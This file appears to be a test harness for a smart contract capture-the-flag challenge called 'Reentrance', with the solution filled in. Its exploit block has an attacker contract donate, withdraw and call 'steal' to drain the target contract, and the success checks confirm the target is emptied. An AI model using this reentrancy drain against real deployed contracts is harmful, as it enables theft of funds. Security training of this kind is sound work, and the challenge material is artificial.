const { ether, expectRevert, expectEvent } = require('@openzeppelin/test-helpers');

const Reentrance = artifacts.require('Reentrance');
const AttackReentrance = artifacts.require('AttackReentrance');

const { expect } = require('chai');
const balance = require('@openzeppelin/test-helpers/src/balance');
const send = require('@openzeppelin/test-helpers/src/send');

contract('[Challenge] Reentrance', function ([deployer, attacker, someUser, ...otherAccounts]) {
  const INIT_REENTRANCE_BALANCE = ether('10');

  before(async function () {
    /** SETUP SCENARIO */
    this.reentrance = await Reentrance.new({ from: deployer });
    this.attackReentrance = await AttackReentrance.new(this.reentrance.address, { from: attacker });
    send.ether(deployer, this.reentrance.address, INIT_REENTRANCE_BALANCE);
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */

    await this.attackReentrance.donate({ from: attacker, value: ether('1') });

    this.beforeAttackerBalance = await balance.current(attacker);

    await this.attackReentrance.withdraw(ether('1'), { from: attacker });
    // console.log(parseInt(await this.reentrance.balances(this.attackReentrance.address)));
    // console.log(parseInt(await balance.current(this.reentrance.address)));
    // console.log(parseInt(await balance.current(this.attackReentrance.address)));

    await this.attackReentrance.steal({ from: attacker });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await balance.current(this.reentrance.address)).to.be.bignumber.eq('0');
    expect(await balance.current(attacker)).to.be.bignumber.gt(this.beforeAttackerBalance);
  });
});
